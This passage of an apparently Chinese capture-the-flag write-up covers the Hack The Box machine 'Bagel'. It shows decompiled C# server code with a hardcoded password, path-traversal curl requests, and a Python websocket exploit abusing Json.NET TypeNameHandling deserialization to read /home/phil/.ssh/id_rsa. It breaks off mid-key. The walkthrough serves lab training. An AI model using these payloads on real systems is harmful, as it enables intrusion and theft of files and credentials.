class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.CompilerServices;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Versioning;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Data.SqlClient;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> WatsonWebsocket;</span><br><span class="line"></span><br><span class="line">[<span class="meta">assembly: CompilationRelaxations(8)</span>]</span><br><span class="line">[<span class="meta">assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)</span>]</span><br><span class="line">[<span class="meta">assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)</span>]</span><br><span class="line">[<span class="meta">assembly: TargetFramework(<span class="meta-string">&quot;.NETCoreApp,Version=v6.0&quot;</span>, FrameworkDisplayName = <span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyCompany(<span class="meta-string">&quot;bagel&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyConfiguration(<span class="meta-string">&quot;Debug&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyFileVersion(<span class="meta-string">&quot;1.0.0.0&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyInformationalVersion(<span class="meta-string">&quot;1.0.0&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyProduct(<span class="meta-string">&quot;bagel&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyTitle(<span class="meta-string">&quot;bagel&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyVersion(<span class="meta-string">&quot;1.0.0.0&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Microsoft.CodeAnalysis</span></span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">CompilerGenerated</span>]</span><br><span class="line">[<span class="meta">Embedded</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">EmbeddedAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">System.Runtime.CompilerServices</span></span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">CompilerGenerated</span>]</span><br><span class="line">[<span class="meta">Microsoft.CodeAnalysis.Embedded</span>]</span><br><span class="line">[<span class="meta">AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">NullableAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">readonly</span> <span class="built_in">byte</span>[] NullableFlags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NullableAttribute</span>(<span class="params"><span class="built_in">byte</span> P_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NullableFlags = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1</span>] &#123; P_0 &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NullableAttribute</span>(<span class="params"><span class="built_in">byte</span>[] P_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NullableFlags = P_0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">[<span class="meta">CompilerGenerated</span>]</span><br><span class="line">[<span class="meta">Microsoft.CodeAnalysis.Embedded</span>]</span><br><span class="line">[<span class="meta">AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">NullableContextAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">readonly</span> <span class="built_in">byte</span> Flag;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NullableContextAttribute</span>(<span class="params"><span class="built_in">byte</span> P_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Flag = P_0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">bagel_server</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Handler</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">Serialize</span>(<span class="params"><span class="built_in">object</span> obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//IL_0003: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0008: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0015: Expected O, but got Unknown</span></span><br><span class="line">JsonSerializerSettings val = <span class="keyword">new</span> JsonSerializerSettings();</span><br><span class="line">val.set_TypeNameHandling((TypeNameHandling)<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> JsonConvert.SerializeObject(obj, (Formatting)<span class="number">1</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">Deserialize</span>(<span class="params"><span class="built_in">string</span> json</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//IL_0003: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0008: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0015: Expected O, but got Unknown</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">JsonSerializerSettings val = <span class="keyword">new</span> JsonSerializerSettings();</span><br><span class="line">val.set_TypeNameHandling((TypeNameHandling)<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> JsonConvert.DeserializeObject&lt;Base&gt;(json, val);</span><br><span class="line">&#125;</span><br><span class="line">catch</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;Message\&quot;:\&quot;unknown\&quot;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Bagel</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> _ServerIp = <span class="string">&quot;*&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">int</span> _ServerPort = <span class="number">5000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> _Ssl = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> WatsonWsServer _Server = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">InitializeServer();</span><br><span class="line">StartServer();</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">Thread.Sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">InitializeServer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//IL_0010: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_001a: Expected O, but got Unknown</span></span><br><span class="line">_Server = <span class="keyword">new</span> WatsonWsServer(_ServerIp, _ServerPort, _Ssl);</span><br><span class="line">_Server.set_AcceptInvalidCertificates(<span class="literal">true</span>);</span><br><span class="line">_Server.add_MessageReceived((EventHandler&lt;MessageReceivedEventArgs&gt;)MessageReceived);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">StartServer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">await</span> _Server.StartAsync(<span class="literal">default</span>(CancellationToken));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MessageReceived</span>(<span class="params"><span class="built_in">object</span> sender, MessageReceivedEventArgs args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> json = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (args.get_Data() != <span class="literal">null</span> &amp;&amp; args.get_Data().Count &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">json = Encoding.UTF8.GetString(args.get_Data().Array, <span class="number">0</span>, args.get_Data().Count);</span><br><span class="line">&#125;</span><br><span class="line">Handler handler = <span class="keyword">new</span> Handler();</span><br><span class="line"><span class="built_in">object</span> obj = handler.Deserialize(json);</span><br><span class="line"><span class="built_in">object</span> obj2 = handler.Serialize(obj);</span><br><span class="line">_Server.SendAsync(args.get_IpPort(), obj2.ToString(), <span class="literal">default</span>(CancellationToken));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Base</span> : <span class="title">Orders</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">int</span> userid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> session = <span class="string">&quot;Unauthorized&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">int</span> UserId</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> userid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">userid = <span class="keyword">value</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> Session</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> session;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">session = <span class="keyword">value</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> Time =&gt; DateTime.Now.ToString(<span class="string">&quot;h:mm:ss&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Orders</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> order_filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> order_info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> File file = <span class="keyword">new</span> File();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">object</span> RemoveOrder &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> WriteOrder</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> file.WriteFile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">order_info = <span class="keyword">value</span>;</span><br><span class="line">file.WriteFile = order_info;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> ReadOrder</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> file.ReadFile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">order_filename = <span class="keyword">value</span>;</span><br><span class="line">order_filename = order_filename.Replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">order_filename = order_filename.Replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">file.ReadFile = order_filename;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">File</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> file_content;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> IsSuccess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> directory = <span class="string">&quot;/opt/bagel/orders/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> filename = <span class="string">&quot;orders.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> ReadFile</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> file_content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">filename = <span class="keyword">value</span>;</span><br><span class="line">ReadContent(directory + filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> WriteFile</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> IsSuccess;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">WriteContent(directory + filename, <span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ReadContent</span>(<span class="params"><span class="built_in">string</span> path</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">IEnumerable&lt;<span class="built_in">string</span>&gt; values = System.IO.File.ReadLines(path, Encoding.UTF8);</span><br><span class="line">file_content += <span class="built_in">string</span>.Join(<span class="string">&quot;\n&quot;</span>, values);</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception)</span><br><span class="line">&#123;</span><br><span class="line">file_content = <span class="string">&quot;Order not found!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">WriteContent</span>(<span class="params"><span class="built_in">string</span> filename, <span class="built_in">string</span> line</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">System.IO.File.WriteAllText(filename, line);</span><br><span class="line">IsSuccess = <span class="string">&quot;Operation successed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception)</span><br><span class="line">&#123;</span><br><span class="line">IsSuccess = <span class="string">&quot;Operation failed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DB</span></span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">Obsolete(<span class="meta-string">&quot;The production team has to decide where the database server will be hosted. This method is not fully implemented.&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DB_connection</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//IL_0008: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_000e: Expected O, but got Unknown</span></span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K&quot;</span>;</span><br><span class="line">SqlConnection val = <span class="keyword">new</span> SqlConnection(text);</span><br><span class="line"><span class="built_in">string</span> text2 = <span class="string">&quot;INSERT INTO orders (Name,Address,Count,Type) VALUES (&#x27;Eliot&#x27;,&#x27;Street&#x27;,4,&#x27;Baggel&#x27;)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能有用的凭证<code>developer:k8wdAYYKyhnjg3K</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">developer@10.10.11.201: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).</span><br></pre></td></tr></table></figure><p>看来不是用来SSH口令登录的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../proc/self/status | cat</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Name:python3</span><br><span class="line">Umask:0022</span><br><span class="line">State:S (sleeping)</span><br><span class="line">Tgid:893</span><br><span class="line">Ngid:0</span><br><span class="line">Pid:893</span><br><span class="line">PPid:1</span><br><span class="line">TracerPid:0</span><br><span class="line">Uid:1000100010001000</span><br><span class="line">Gid:1000100010001000</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../proc/891/status | cat</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Name:dotnet</span><br><span class="line">Umask:0022</span><br><span class="line">State:S (sleeping)</span><br><span class="line">Tgid:891</span><br><span class="line">Ngid:0</span><br><span class="line">Pid:891</span><br><span class="line">PPid:1</span><br><span class="line">TracerPid:0</span><br><span class="line">Uid:1001100110011001</span><br><span class="line">Gid:1001100110011001</span><br></pre></td></tr></table></figure><p>8000端口的WEB服务所有者为用户developer，5000端口的WS服务所有者为用户phil</p><blockquote><p><a href="https://www.cnblogs.com/nice0e3/p/15294585.html">https://www.cnblogs.com/nice0e3/p/15294585.html</a><br /><a href="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15">https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15</a></p></blockquote><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JsonSerializerSettings val = <span class="keyword">new</span> JsonSerializerSettings();</span><br><span class="line">val.set_TypeNameHandling((TypeNameHandling)<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p>反序列化设置<code>TypeNameHandling</code>为，即auto，所以我们可以利用对象<code>RemoveOrder</code>利用反序列化在处理<code>typeName</code>时的漏洞</p><p>编写<code>ws.py</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ws.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">ws = websocket.WebSocket()    </span><br><span class="line">ws.connect(<span class="string">&quot;ws://10.10.11.201:5000/&quot;</span>) <span class="comment"># connect to order app</span></span><br><span class="line">order = &#123;<span class="string">&quot;RemoveOrder&quot;</span>: &#123;<span class="string">&quot;$type&quot;</span>: <span class="string">&quot;bagel_server.File, bagel&quot;</span>, <span class="string">&quot;ReadFile&quot;</span>:<span class="string">&quot;../../..%s&quot;</span> % sys.argv[<span class="number">1</span>]&#125;&#125;</span><br><span class="line">data = <span class="built_in">str</span>(json.dumps(order))</span><br><span class="line">ws.send(data)</span><br><span class="line">result = ws.recv()</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><code>$type</code>的值为程序集限定名，即调用<code>bagel</code>(程序集名称，貌似可以粗略理解为dll的文件名)中命名空间<code>bagel_server</code>的<code>File</code>类<br />然后调用函数<code>ReadFile</code>并进行赋值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ws.py /home/phil/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p>得到SSH私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;-----BEGIN OPENSSH PRIVATE 